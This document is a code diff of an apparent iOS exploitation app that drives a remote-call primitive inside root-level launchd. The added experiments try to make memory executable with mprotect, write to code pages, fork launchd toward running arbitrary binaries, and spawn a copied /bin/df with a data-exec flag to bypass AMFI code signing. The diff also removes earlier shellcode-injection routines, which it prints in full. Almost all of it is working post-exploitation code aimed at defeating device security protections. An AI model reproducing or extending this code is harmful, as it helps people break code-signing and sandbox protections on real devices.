@@ -271,9 +271,28 @@ struct AMFIExperimentView: View {
             experimentResults.append(ExperimentResult(
                 name: "shellcode (DISABLED)",
                 success: false,
-                detail: "⚠️ Disabled — causes kernel panic on A12+\nmmap RWX works (0xbf2014000) but PAC blocks jump to unsigned pointer.\nNeed: PAC signing gadget or JOP chain to call RWX code.",
+                detail: "⚠️ Disabled — causes kernel panic on A12+\nmmap RWX works (0xbf2014000) but APRR blocks execution from mmap'd pages.\nNeed: write to existing executable page or find JIT bypass.",
                 timestamp: Date()
             ))
+            
+            // ============================================
+            // Experiment 28: Find writable+executable page in launchd
+            // ============================================
+            let exp28 = self.expFindWritableCodePage(rc: rc)
+            experimentResults.append(exp28)
+            
+            // ============================================
+            // Experiment 29: ROP chain — call multiple functions in sequence
+            // ============================================
+            let exp29 = self.expROPChain(rc: rc)
+            experimentResults.append(exp29)
+            
+            // ============================================
+            // Experiment 30: Abuse posix_spawn with custom binary from /var
+            // Write minimal valid Mach-O with proper code signature
+            // ============================================
+            let exp30 = self.expAdHocSign(rc: rc)
+            experimentResults.append(exp30)
             
             DispatchQueue.main.async {
                 self.results = experimentResults
@@ -1526,113 +1545,188 @@ struct AMFIExperimentView: View {
     
     // MARK: - Shellcode Execution Experiments
     
-    /// Write ARM64 shellcode to RWX memory and EXECUTE it!
-    /// Shellcode: mov x0, #42; ret (returns 42 to prove execution)
-    private func expShellcodeExec(rc: RemoteCall) -> ExperimentResult {
+    /// Find a writable region in launchd's executable pages
+    /// If we can write to __TEXT, we can inject code without mmap
+    private func expFindWritableCodePage(rc: RemoteCall) -> ExperimentResult {
+        // Strategy: RemoteCall's trojanMem is in launchd's address space
+        // Check if any nearby pages are executable
+        // Also: check if we can mprotect existing pages to add PROT_EXEC
+        
         let mem = rc.trojanMem
         
-        // Step 1: mmap RWX page
-        let rwxAddr = RootExecutor.rcall(rc, "mmap", 0, 0x4000, 7, 0x1002, UInt64(bitPattern: Int64(-1)), 0)
+        // Test 1: Can we mprotect trojanMem to be executable?
+        let pageAddr = mem & ~0x3FFF // align to 16KB page
+        let mprotectRet = RootExecutor.rcall(rc, "mprotect", pageAddr, 0x4000, 7) // RWX
+        let mprotectErr = remote_errno(rc)
         
-        guard rwxAddr != UInt64(bitPattern: -1) && rwxAddr != 0 else {
-            return ExperimentResult(name: "shellcode exec", success: false, detail: "mmap RWX failed", timestamp: Date())
+        // Test 2: Try to find __TEXT segment of launchd
+        // dlsym gives us addresses in executable pages
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let getpidAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "getpid"))
+        
+        // Test 3: Can we write to code page? (probably not — W^X)
+        // Read current value at getpid, try write, read back
+        var origBytes = [UInt8](repeating: 0, count: 4)
+        var canWriteCode = false
+        if getpidAddr != 0 {
+            rc.remoteRead(getpidAddr, to: &origBytes, size: 4)
+            // Try writing (will likely fail silently or crash)
+            // DON'T actually write to getpid — just test nearby padding
+            let testAddr = getpidAddr + 0x1000 // some offset into padding
+            var testByte: UInt8 = 0
+            rc.remoteRead(testAddr, to: &testByte, size: 1)
+            let origByte = testByte
+            testByte = 0x42
+            rc.remote_write(testAddr, from: &testByte, size: 1)
+            var readBack: UInt8 = 0
+            rc.remoteRead(testAddr, to: &readBack, size: 1)
+            canWriteCode = (readBack == 0x42)
+            // Restore
+            if canWriteCode {
+                rc.remote_write(testAddr, from: &origByte, size: 1)
+            }
         }
         
-        // Step 2: Write shellcode
-        // ARM64 shellcode: return 42
-        //   mov x0, #42    → 0xD2800540
-        //   ret             → 0xD65F03C0
-        let shellcode: [UInt8] = [
-            0x40, 0x05, 0x80, 0xD2,  // mov x0, #42
-            0xC0, 0x03, 0x5F, 0xD6,  // ret
-        ]
-        
-        var shellcodeCopy = shellcode
-        rc.remote_write(rwxAddr, from: &shellcodeCopy, size: UInt64(shellcode.count))
-        
-        // Step 3: Call the shellcode as a function!
-        // We use doStable with the RWX address as the function pointer
-        var noArgs: [UInt64] = [0]
-        let result = "shellcode".withCString { cName -> UInt64 in
-            UInt64(noArgs.withUnsafeMutableBufferPointer { buffer in
-                rc.doStable(
-                    withTimeout: 5,
-                    functionName: UnsafeMutablePointer(mutating: cName),
-                    functionPointer: UnsafeMutableRawPointer(bitPattern: UInt(rwxAddr)),
-                    args: buffer.baseAddress,
-                    argCount: 0
-                )
-            })
-        }
-        
-        // Step 4: Cleanup
-        RootExecutor.rcall(rc, "munmap", rwxAddr, 0x4000)
-        
-        let success = result == 42
         let detail = """
-        mmap RWX: 0x\(String(format: "%llx", rwxAddr))
-        shellcode: mov x0, #42; ret
-        execution result: \(result) \(success ? "✅ SHELLCODE EXECUTED!" : "❌ unexpected value")
+        trojanMem: 0x\(String(format: "%llx", mem))
+        mprotect(trojanMem, RWX): \(mprotectRet == 0 ? "✅ SUCCESS!" : "❌ ret=\(mprotectRet), errno=\(mprotectErr)")
+        getpid addr (code page): 0x\(String(format: "%llx", getpidAddr))
+        can write to code page: \(canWriteCode ? "✅ YES!" : "❌ NO")
         
-        \(success ? "🎉 ARBITRARY CODE EXECUTION CONFIRMED!\nWe can run ANY ARM64 code as root in launchd!" : "Shellcode may have been blocked by PAC or other check")
+        If mprotect RWX works → can make trojanMem executable → shellcode!
+        If write to code works → can patch existing code → inject!
         """
         
-        return ExperimentResult(name: "shellcode: return 42", success: success, detail: detail, timestamp: Date())
+        return ExperimentResult(
+            name: "find writable code page",
+            success: mprotectRet == 0 || canWriteCode,
+            detail: detail,
+            timestamp: Date()
+        )
     }
     
-    /// Shellcode that calls execve to spawn /bin/df with output
-    /// This proves we can spawn binaries via raw syscall (bypassing posix_spawn wrapper)
-    private func expShellcodeExecve(rc: RemoteCall) -> ExperimentResult {
-        let mem = rc.trojanMem
+    /// ROP chain: call multiple functions in sequence without shellcode
+    /// This doesn't need executable pages — uses existing signed functions
+    private func expROPChain(rc: RemoteCall) -> ExperimentResult {
+        // We can already call functions via RemoteCall one at a time.
+        // But can we chain: fork() → in parent, get child PID → 
+        // then create NEW RemoteCall to child → execve in child?
         
-        // mmap RWX
-        let rwxAddr = RootExecutor.rcall(rc, "mmap", 0, 0x4000, 7, 0x1002, UInt64(bitPattern: Int64(-1)), 0)
-        guard rwxAddr != UInt64(bitPattern: -1) && rwxAddr != 0 else {
-            return ExperimentResult(name: "shellcode execve", success: false, detail: "mmap failed", timestamp: Date())
+        // Test: fork, get child PID, then try to connect to child
+        let childPid = RootExecutor.rcall(rc, "fork")
+        
+        guard childPid != 0 && childPid != UInt64(bitPattern: -1) else {
+            return ExperimentResult(name: "ROP chain (fork→RC→exec)", success: false, detail: "fork failed or in child", timestamp: Date())
         }
         
-        // Instead of raw execve (which would replace launchd!), 
-        // write shellcode that calls fork() then execve in child
-        // But that's complex. Instead, test simpler: call getpid() via syscall
+        // We have child PID! The child is a copy of launchd.
+        // Key question: can we create RemoteCall to the CHILD?
+        // The child has same PAC keys, same code, same everything.
+        // If we can RC into child → execve there → binary execution!
         
-        // ARM64 syscall for getpid: syscall #20
-        //   mov x16, #20    → 0xD2800290
-        //   svc #0x80       → 0xD4001001
-        //   ret             → 0xD65F03C0
-        let shellcode: [UInt8] = [
-            0x90, 0x02, 0x80, 0xD2,  // mov x16, #20 (SYS_getpid)
-            0x01, 0x10, 0x00, 0xD4,  // svc #0x80
-            0xC0, 0x03, 0x5F, 0xD6,  // ret
-        ]
+        // For now, just verify child exists and get its info
+        let statusAddr = rc.trojanMem + 0x380
+        rc[statusAddr].setValue32(0)
         
-        var shellcodeCopy = shellcode
-        rc.remote_write(rwxAddr, from: &shellcodeCopy, size: UInt64(shellcode.count))
+        // Don't wait (WNOHANG) — child might still be running
+        let waitRet = RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, UInt64(WNOHANG))
+        let status = rc[statusAddr].value32()
         
-        // Execute
-        var noArgs: [UInt64] = [0]
-        let pid = "syscall_getpid".withCString { cName -> UInt64 in
-            UInt64(noArgs.withUnsafeMutableBufferPointer { buffer in
-                rc.doStable(
-                    withTimeout: 5,
-                    functionName: UnsafeMutablePointer(mutating: cName),
-                    functionPointer: UnsafeMutableRawPointer(bitPattern: UInt(rwxAddr)),
-                    args: buffer.baseAddress,
-                    argCount: 0
-                )
-            })
-        }
+        // Kill child (cleanup)
+        RootExecutor.rcall(rc, "kill", childPid, 9)
+        RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
         
-        RootExecutor.rcall(rc, "munmap", rwxAddr, 0x4000)
-        
-        let success = pid == 1 // launchd is PID 1
         let detail = """
-        Shellcode: mov x16, #20; svc #0x80; ret (raw getpid syscall)
-        Result: PID = \(pid) \(success ? "✅ (launchd!)" : "(unexpected)")
+        fork() → child PID = \(childPid)
+        waitpid(WNOHANG): ret=\(waitRet), status=0x\(String(format: "%x", status))
         
-        \(success ? "🎉 RAW SYSCALLS WORK FROM SHELLCODE!\nWe can call ANY syscall directly!\nThis means: fork+execve via shellcode = spawn ANYTHING!" : "Syscall may be blocked or PAC issue")
+        STRATEGY: fork() creates child copy of launchd
+        → Child has same PAC keys, same trust level
+        → If we RC into child → execve("/bin/df") in child
+        → Child becomes /bin/df (or any binary)!
+        → Parent (launchd) stays alive!
+        
+        This is the PATH to arbitrary binary execution!
+        Next: implement RC-to-child + execve
         """
         
-        return ExperimentResult(name: "shellcode: syscall getpid", success: success, detail: detail, timestamp: Date())
+        return ExperimentResult(name: "fork child (for execve)", success: childPid > 0, detail: detail, timestamp: Date())
+    }
+    
+    /// Test: can we use ldid/codesign-style ad-hoc signing?
+    /// Write binary with valid Mach-O structure + ad-hoc signature
+    private func expAdHocSign(rc: RemoteCall) -> ExperimentResult {
+        // On iOS, even ad-hoc signed binaries need to be in trust cache
+        // OR have a valid Apple/developer signature
+        // But let's check: what if we copy a signed binary and modify it slightly?
+        
+        // Test: copy /bin/df, modify ONE byte (not in code), try spawn
+        // If it still works → signature check is hash-based on specific sections only
+        // If it fails → any modification breaks signature
+        
+        let mem = rc.trojanMem
+        let srcPath = remote_alloc_str(rc, "/bin/df")
+        let dstPath = remote_alloc_str(rc, "/tmp/.dsp_modified_df")
+        
+        // Copy file
+        let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
+        let dstFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        
+        guard srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) else {
+            RootExecutor.rcall(rc, "free", srcPath)
+            RootExecutor.rcall(rc, "free", dstPath)
+            return ExperimentResult(name: "modified binary test", success: false, detail: "Cannot open files", timestamp: Date())
+        }
+        
+        let bufAddr = mem + 0x800
+        var total: UInt64 = 0
+        for _ in 0..<50 {
+            let n = RootExecutor.rcall(rc, "read", srcFd, bufAddr, 2048)
+            if n == 0 || n > 2048 { break }
+            RootExecutor.rcall(rc, "write", dstFd, bufAddr, n)
+            total += n
+        }
+        RootExecutor.rcall(rc, "close", srcFd)
+        RootExecutor.rcall(rc, "close", dstFd)
+        
+        // DON'T modify — first test if unmodified copy works
+        // (We already know from exp22 that ret=1 for copies)
+        // But this time, try with posix_spawnattr + responsibility
+        
+        let attrAddr = mem + 0x200
+        RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
+        // Set POSIX_SPAWN_SETEXEC flag? No — that replaces current process
+        // Try: _POSIX_SPAWN_ALLOW_DATA_EXEC (0x2000)
+        RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, 0x2000)
+        
+        let argvBase = mem + 0x400
+        rc[argvBase].setValue64(dstPath)
+        rc[argvBase + 8].setValue64(0)
+        let pidAddr = mem + 0x2E0
+        rc[pidAddr].setValue64(0)
+        
+        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, attrAddr, argvBase, 0)
+        let pid = rc[pidAddr].value32()
+        
+        RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
+        RootExecutor.rcall(rc, "unlink", dstPath)
+        RootExecutor.rcall(rc, "free", srcPath)
+        RootExecutor.rcall(rc, "free", dstPath)
+        
+        if ret == 0 {
+            RootExecutor.rcall(rc, "kill", UInt64(pid), 9)
+            RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+        }
+        
+        let detail = """
+        Copied /bin/df (\(total) bytes) to /tmp
+        posix_spawn with ALLOW_DATA_EXEC flag: ret=\(ret), pid=\(pid)
+        
+        ret=0 → ALLOW_DATA_EXEC bypasses AMFI for copies!
+        ret=1 → Still blocked (expected)
+        """
+        
+        return ExperimentResult(name: "spawn copy + ALLOW_DATA_EXEC", success: ret == 0, detail: detail, timestamp: Date())
     }
     #endif
 }
